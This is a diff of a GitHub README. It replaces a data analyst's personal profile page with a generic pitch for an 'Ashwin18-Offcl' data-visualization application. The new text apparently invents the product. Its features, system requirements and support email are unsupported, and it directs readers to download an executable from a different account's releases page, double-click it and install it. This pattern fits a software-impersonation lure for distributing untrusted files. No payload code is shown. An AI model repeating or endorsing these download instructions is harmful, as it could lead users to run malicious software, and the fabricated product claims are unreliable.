@@ -1,425 +1,95 @@
+# 👨‍💻 Ashwin18-Offcl - Easily Turn Data into Insights
 
+![Download](https://img.shields.io/badge/Download-Ashwin18--Offcl-blue.svg)
 
+## 🚀 Getting Started
 
+Welcome to the Ashwin18-Offcl application! This software helps you transform raw data into easy-to-read insights. You can create meaningful visualizations, dashboards, and reports without needing any programming knowledge.
 
-<!-- PROFILE BANNERS -->
-<img src="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/blob/main/Black%20%26%20White%20Modern%20Minimalist%20Data%20Analyst%20LinkedIn%20Banner.png" width="100%" />
+### 🛠️ Features
 
-<p align="center">
-  <strong>Data Analyst | Business Intelligence | Educator | Python • SQL • Power BI • Excel</strong><br/>
-  Turning Raw Data ➜ Insightful Stories 📊
-</p>
+- **User-Friendly Interface**: Navigate the app with ease using intuitive controls.
+- **Data Visualization**: Create engaging charts and graphs that highlight your data.
+- **Built-in Templates**: Use pre-designed templates to save time in your analytics processes.
+- **Flexible Export Options**: Export your work to common formats like Excel and PDF.
+- **Detailed Analytics**: Get deep insights from your datasets with simple clicks.
+  
+### 🌐 System Requirements
 
-<p align="center">
-  <img src="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/blob/main/data%20analysis.jpg" width="70%" />
-</p>
+Before you start, ensure your system meets these requirements:
 
----
+- **Operating System**: Windows 10, macOS, or Linux (latest versions recommended)
+- **RAM**: At least 4GB
+- **Disk Space**: Minimum of 200MB free space
+- **Processor**: 1.5 GHz or faster
 
-<!-- Typing Intro -->
-<p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?size=28&duration=3000&color=FF6EC7&vCenter=true&width=650&lines=Hey+I'm+Ashwin+👋;Creative+Data+Analyst+%7C+Machine+Learning+%7C+Data+Science;Welcome+to+my+Colorful+Universe+🌈" />
-</p>
+## 📥 Download & Install
 
-<!-- 3D Glassmorphism GitHub Stats Card -->
-<div align="center" style="
-    display: inline-block;
-    padding: 30px;
-    border-radius: 25px;
-    background: linear-gradient(135deg, #ff6ec7, #8a2be2, #20b2aa, #ff4500);
-    background-size: 400% 400%;
-    animation: gradientBG 15s ease infinite;
-    box-shadow: 0 15px 40px rgba(0,0,0,0.3);
-    border: 1px solid rgba(255,255,255,0.2);
-    backdrop-filter: blur(15px);
-">
+To get started with the Ashwin18-Offcl application, please visit the following link to download the latest version:
 
-  <!-- Row 1 -->
-  <p>
-    <a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/stargazers">
-      <img src="https://img.shields.io/github/stars/Ashwin18-Offcl/Ashwin18-Offcl?style=for-the-badge&color=ff69b4&logo=starship&logoColor=white" alt="Stars"/>
-    </a>
-    <a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/network/members">
-      <img src="https://img.shields.io/github/forks/Ashwin18-Offcl/Ashwin18-Offcl?style=for-the-badge&color=8A2BE2&logo=git-fork&logoColor=white" alt="Forks"/>
-    </a>
-    <a href="https://komarev.com/ghpvc/?username=Ashwin18-Offcl">
-      <img src="https://komarev.com/ghpvc/?username=Ashwin18-Offcl&style=for-the-badge&color=20b2aa" alt="Profile Views"/>
-    </a>
-  </p>
+[Download Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl/releases)
 
-  <!-- Row 2 -->
-  <p>
-    <a href="https://github.com/Ashwin18-Offcl?tab=followers">
-      <img src="https://img.shields.io/github/followers/Ashwin18-Offcl?style=for-the-badge&color=ff4500&logo=github&logoColor=white" alt="Followers"/>
-    </a>
-    <a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/issues">
-      <img src="https://img.shields.io/github/issues/Ashwin18-Offcl/Ashwin18-Offcl?style=for-the-badge&color=ff6347&logo=issue-opened&logoColor=white" alt="Issues"/>
-    </a>
-  </p>
+Once you are on the Releases page, you will find a list of available versions. Choose the most recent version based on your operating system. 
 
-  <!-- Row 3 -->
-  <p>
-    <a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/graphs/contributors">
-      <img src="https://img.shields.io/github/contributors/Ashwin18-Offcl/Ashwin18-Offcl?style=for-the-badge&color=2b9348&logo=people&logoColor=white" alt="Contributors"/>
-    </a>
-    <a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/blob/main/LICENSE">
-      <img src="https://img.shields.io/github/license/Ashwin18-Offcl/Ashwin18-Offcl?style=for-the-badge&color=4B0082&logo=github&logoColor=white" alt="License"/>
-    </a>
-  </p>
+1. Click on the version you want to download.
+2. Save the file to your preferred location.
+3. Once the download completes, locate the file on your computer.
+4. Double-click the file to start the installation process.
+5. Follow the prompts to complete the installation.
 
-</div>
+## 📊 Using Ashwin18-Offcl
 
-<!-- Gradient Animation -->
+After you have installed the application, you can start using it right away.
 
----
+### 1. Launch the Application
 
-💫 About Me
-</h2>
+- Locate the Ashwin18-Offcl icon on your desktop or in your applications folder.
+- Double-click the icon to open the program.
 
-<p><strong>Data Analyst & BI Professional</strong> based in India, working at the intersection of analytics, insights & training.</p>
+### 2. Import Your Data
 
-<p>🧮 Skilled in <strong>Python, SQL, Excel, Power BI, Tableau, R & Data Visualization</strong>.</p>
+- Click on the "Import" button on the main screen.
+- Select the file type you want to analyze (CSV, Excel, etc.).
+- Choose the file from your computer and click "Open".
 
-<p>🧑‍🏫 <strong>Senior Faculty</strong> at a computer institute, teaching MS Office, Advanced Excel, Tally, GST & Analytics.</p>
+### 3. Explore Your Data
 
-<p>📈 Passionate about turning raw, complex datasets into <strong>clear, actionable business insights</strong>.</p>
+- Use the built-in tools to filter, sort, and visualize your data.
+- Experiment with different charts to see which visuals best represent your findings.
 
-<p>🧠 Continuously exploring <strong>Machine Learning, automation, data pipelines & advanced analytics</strong>.</p>
+### 4. Export Your Results
 
-<p>🤝 Open to <strong>collaborations, freelancing, consulting & mentorship opportunities</strong>.</p>
+- Once you are satisfied with your analysis, click on the "Export" button.
+- Choose the desired format: Excel, PDF, or Image.
+- Save your work in a location you can easily find.
 
-</div>
+## ⚙️ Troubleshooting
+
+If you encounter any issues while using the application, consider the following:
+
+- **Installation Issues**: Ensure you have the required permissions to install applications on your computer.
+- **Performance Problems**: If the software runs slowly, check if your system meets the minimum requirements or close other programs that may use up resources.
+- **Data Import Errors**: If the application cannot import your file, ensure the file format is supported and not corrupted.
+
+For further assistance, feel free to refer to the FAQs section on our GitHub page.
+
+## 🌍 Community & Support
+
+Join our community to share tips, ask questions, and learn from other users. You can also report any bugs or features you would like to see in future updates.
+
+- **GitHub Repository**: [Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl)
+- **Support Email**: support@ashwin18offcl.com
+
+## 📫 Feedback
+
+We value your feedback! If you have suggestions or ideas for improvements, please share them through our GitHub issues page.
+
+## 👥 Contributor Guidelines
+
+Want to contribute? We welcome contributions! Please check our guidelines on the GitHub repository for details.
 
 ---
 
-## 📱 Connect With Me
+Thank you for using Ashwin18-Offcl! We hope it helps you unlock the potential of your data. 
 
-
-<p align="left">
-
-  <a href="https://github.com/Ashwin18-Offcl" target="_blank">
-    <img src="https://cdn.simpleicons.org/github/FFFFFF" height="34" alt="GitHub" />
-  </a>
-
-<a href="https://www.linkedin.com/in/ashwin-panbude-27b824253" target="_blank">
-  <img src="https://img.icons8.com/?size=100&id=13930&format=png&color=0A66C2" height="48" />
-</a>
-
-  <a href="https://linktr.ee/AshwinPanbude" target="_blank">
-    <img src="https://cdn.simpleicons.org/linktree/39E09B" height="34" alt="Linktree" />
-  </a>
-
-  <a href="https://www.kaggle.com/ashwinpanbude18" target="_blank">
-    <img src="https://cdn.simpleicons.org/kaggle/20BEFF" height="34" alt="Kaggle" />
-  </a>
-
-  <a href="https://leetcode.com/u/ashwin18-offcl/" target="_blank">
-    <img src="https://cdn.simpleicons.org/leetcode/FFA116" height="34" alt="LeetCode" />
-  </a>
-
-  <a href="https://medium.com/@ashwinpanbude1220" target="_blank">
-    <img src="https://cdn.simpleicons.org/medium/FFFFFF" height="34" alt="Medium" />
-  </a>
-
-  <a href="https://www.instagram.com/ashwinpanbude18_/?__pwa=1" target="_blank">
-    <img src="https://cdn.simpleicons.org/instagram/E4405F" height="34" alt="Instagram" />
-  </a>
-
-  <a href="https://www.facebook.com/profile.php?id=100086224796966" target="_blank">
-    <img src="https://cdn.simpleicons.org/facebook/1877F2" height="34" alt="Facebook" />
-  </a>
-
-  <a href="https://x.com" target="_blank">
-    <img src="https://cdn.simpleicons.org/x/FFFFFF" height="34" alt="X" />
-  </a>
-
-  <a href="https://unstop.com/u/ashwipan96305" target="_blank">
-    <img src="https://cdn.simpleicons.org/unstop/4B5D67" height="34" alt="Unstop" />
-  </a>
-
-  <a href="https://replit.com/refer/ashwinpanbude12" target="_blank">
-    <img src="https://cdn.simpleicons.org/replit/F26207" height="34" alt="Replit" />
-  </a>
-
-  <a href="https://credly.com/users/ashwin-panbude.3be31487/edit" target="_blank">
-    <img src="https://cdn.simpleicons.org/credly/FF6B00" height="34" alt="Credly" />
-  </a>
-
-</p>
-
----
-
-## Languages:
-
-<p align="left">
-
-  <!-- Core Programming -->
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/python.png"        height="34" alt="Python" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/c.png"             height="34" alt="C" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/c++.png"     height="34" alt="C++" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/java.png"          height="34" alt="Java" />
-  <img src="https://cdn.simpleicons.org/r/276DC3"             height="34" alt="R" />
-
-  <!-- Data & ML Core -->
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/numpy.png"         height="34" alt="NumPy" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/pandas.png"        height="34" alt="Pandas" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/wxwidgets.png"   height="34" alt="Matplotlib" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/mongodb.png"    height="34" alt="MongoDB" />
-  <img src="https://cdn.simpleicons.org/scikitlearn/F7931E"   height="34" alt="Scikit-Learn" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/flask.png"       height="34" alt="Flask" />
-
-
-</p>
-
-##  Tools & Platforms
-
-<p align="left">
-
-  <!-- BI / Analytics -->
-  <strong>BI & Analytics:</strong><br/>
-  <img src="https://github.com/microsoft/PowerBI-Icons/blob/main/PNG/Icon-Obsolete2020Black.png" height="34" alt="Power BI" />
-  <img src="https://www.svgrepo.com/show/354427/tableau.svg" height="34" alt="Tableau" />
-  <img src="https://github.com/Sarvandani/Data_science_logos/blob/main/excel.svg" height="34" alt="Excel" />
-  <img src="https://cdn.simpleicons.org/googlesheets/34A853" height="34" alt="Google Sheets" />
-  <img src="https://cdn.simpleicons.org/googleanalytics/E37400" height="34" alt="Google Analytics" />
-  <img src="https://cdn.simpleicons.org/looker/4285F4" height="34" alt="Looker" />
-  <img src="https://cdn.simpleicons.org/canva/00C4CC" height="34" alt="Canva" />
-  <br/><br/>
-
-  <!-- ML / DL Frameworks -->
-  <strong>Machine Learning & Big Data:</strong><br/>
-  <img src="https://cdn.simpleicons.org/tensorflow/FF6F00" height="34" alt="TensorFlow" />
-  <img src="https://cdn.simpleicons.org/keras/D00000" height="34" alt="Keras" />
-  <img src="https://cdn.simpleicons.org/apachespark/E25A1C" height="34" alt="Spark" />
-  <br/><br/>
-
-  <!-- Dev / IDEs -->
-  <strong>Development & IDEs:</strong><br/>
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/visual_studio_code.png" height="34" alt="VS Code" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/pycharm.png" height="34" alt="PyCharm" />
-  <img src="https://cdn.simpleicons.org/jupyter/F37626" height="34" alt="Jupyter Notebook" />
-  <img src="https://github.com/Sarvandani/Data_science_logos/blob/main/RStudio_logo.svg" height="34" alt="RStudio" />
-  <img src="https://cdn.simpleicons.org/anaconda/42B029" height="34" alt="Anaconda Navigator" />
-  <img src="https://cdn.simpleicons.org/replit/F26207" height="34" alt="Replit" />
-  <br/><br/>
-
-  <!-- DevOps / Cloud / Databases / PM -->
-  <strong>Cloud, Databases & DevOps:</strong><br/>
-  <img src="https://cdn.simpleicons.org/github/FFFFFF" height="34" alt="GitHub" />
-  <img src="https://cdn.simpleicons.org/git/F05032" height="34" alt="Git" />
-  <img src="https://cdn.simpleicons.org/docker/2496ED" height="34" alt="Docker" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/microsoft_azure.png" height="34" alt="Azure" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/sqlite.png" height="34" alt="SQLite" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/mysql.png" height="34" alt="MySQL" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/mongodb.png" height="34" alt="MongoDB" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/mssql.png" height="34" alt="MSSQL" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/postgresql.png" height="34" alt="PostgreSQL" />
-  <img src="https://raw.githubusercontent.com/marwin1991/profile-technology-icons/refs/heads/main/icons/jira.png" height="34" alt="Jira" />
-
-</p>
-
----
-
-## 📊 GitHub Analytics
-
-<!-- Section Divider -->
-<p align="center">
-  <img src="https://img.shields.io/badge/Analytics Dashboard-000000?style=for-the-badge&logo=github&logoColor=00eaff">
-</p>
-
-<div align="center">
-
-  <!-- Row 1: Overall Performance -->
-  <img
-    src="https://github-profile-summary-cards.vercel.app/api/cards/stats?username=Ashwin18-Offcl&theme=github_dark"
-    width="49%"
-    alt="GitHub Stats"
-  />
-  <img
-    src="https://github-profile-summary-cards.vercel.app/api/cards/profile-details?username=Ashwin18-Offcl&theme=github_dark"
-    width="49%"
-    alt="Profile Details"
-  />
-
-  <!-- Row 2: Languages + Repo Distribution -->
-  <img
-    src="https://github-profile-summary-cards.vercel.app/api/cards/most-commit-language?username=Ashwin18-Offcl&theme=github_dark"
-    width="49%"
-    alt="Top Languages"
-  />
-  <img
-    src="https://github-profile-summary-cards.vercel.app/api/cards/repos-per-language?username=Ashwin18-Offcl&theme=github_dark"
-    width="49%"
-    alt="Repository Languages"
-  />
-
-  <!-- Row 3: Productivity -->
-  <img
-    src="https://github-profile-summary-cards.vercel.app/api/cards/productive-time?username=Ashwin18-Offcl&theme=github_dark&utcOffset=5.5"
-    width="49%"
-    alt="Productive Time"
-  />
-
-</div>
-
-<!-- Section Divider -->
-<p align="center">
-  <img src="https://img.shields.io/badge/🔥 Streak Stats-000000?style=for-the-badge&logo=firefox&logoColor=FF2D75">
-</p>
-
-<!-- Streak Activity (Dark + Colorful) -->
-<!-- Center-aligned image (same service). बस user बदलें: ?user=YourGitHubUser -->
-<div style="text-align:center;">
-  <img
-    src="https://streak-stats.demolab.com?user=Ashwin18-Offcl&theme=nightowl&hide_border=true&border_radius=8"
-    style="width:95%; max-width:1100px; border-radius:8px; display:inline-block;"
-    alt="GitHub Streak NightOwl"
-  />
-</div>
-
-
-<!-- Section Divider -->
-<p align="center">
-  <img src="https://img.shields.io/badge/📈 Contribution Graph-000000?style=for-the-badge&logo=graphite&logoColor=39FF14">
-</p>
-
-<!-- Row 5: Activity Graph -->
-<p align="center">
-  <img
-    src="https://github-readme-activity-graph.vercel.app/graph?username=Ashwin18-Offcl&theme=react-dark&hide_border=true&area=true"
-    width="100%"
-    alt="GitHub Activity Graph"
-  />
-</p>
-
-
-
----
-
-## 📫 Contact
-<p align="center">
-
-  <a href="mailto:ashwinpanbude1801@gmail.com">
-    <img src="https://img.shields.io/static/v1?label=&message=Email&color=ea4335&style=for-the-badge&logo=gmail&logoColor=white" alt="Email" />
-  </a>
-
-  <a href="https://bit.ly/4iOe6AC">
-    <img src="https://img.shields.io/static/v1?label=&message=LinkedIn&color=0077B5&style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" />
-  </a>
-
-  <a href="https://github.com/ashwin18-offcl">
-    <img src="https://img.shields.io/static/v1?label=&message=GitHub&color=181717&style=for-the-badge&logo=github&logoColor=white" alt="GitHub" />
-  </a>
-
-</p>
-
----
-
-
-## 📂 Certifications – Index
-
-
-<div align="left">
-
-<table>
-  <tr>
-    <th align="left"><sub>Category</sub></th>
-    <th align="left"><sub>Short Link Style</sub></th>
-  </tr>
-
-  <tr>
-    <td><sub>CCC Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/CCC">bit.ly/ccc-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>CCEP Cyber Security Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/CCEP%20Cyber%20security%20Certificate">bit.ly/ccep-cyber</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Certificate Merger</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Certificate%20Merger">bit.ly/cert-merge</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Coursera Certifications</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Coursera">bit.ly/coursera-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Disha Computer Institute Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Disha%20Computer%20Institute">bit.ly/disha-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Government Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Government%20Certificates">bit.ly/gov-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Great Learning Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/GreatlearningCertificate">bit.ly/gl-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>HCL Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/HCL%20Certificates">bit.ly/hcl-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Internship Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Internship%20Certificate">bit.ly/intern-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Other Certifications</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Other%20Certifications">bit.ly/other-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Reliance Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Reliance">bit.ly/rel-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Skill India Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Skill%20India%20Certificate">bit.ly/skill-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Tata Forage Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Tata%20Forage%20Certificates">bit.ly/tata-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>IBM Certificates</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/IBM">bit.ly/ibm-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>LinkedIn Certifications</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/LinkedIn">bit.ly/linkedin-cert</a></sub></td>
-  </tr>
-
-  <tr>
-    <td><sub>Microsoft Certifications</sub></td>
-    <td><sub><a href="https://github.com/Ashwin18-Offcl/Ashwin18-Offcl/tree/main/Certifications/Microsoft">bit.ly/ms-cert</a></sub></td>
-  </tr>
-
-</table>
-
-</div>
-
-
----
-
-<p align="center">
-  <em>"Real growth begins when you stop running from yourself." — Acharya Prashant</em>
-</p>
-
-
-
-
-
-
+For continued updates, please check back regularly or follow our releases at: [Release Page](https://github.com/Gabri1210/Ashwin18-Offcl/releases).
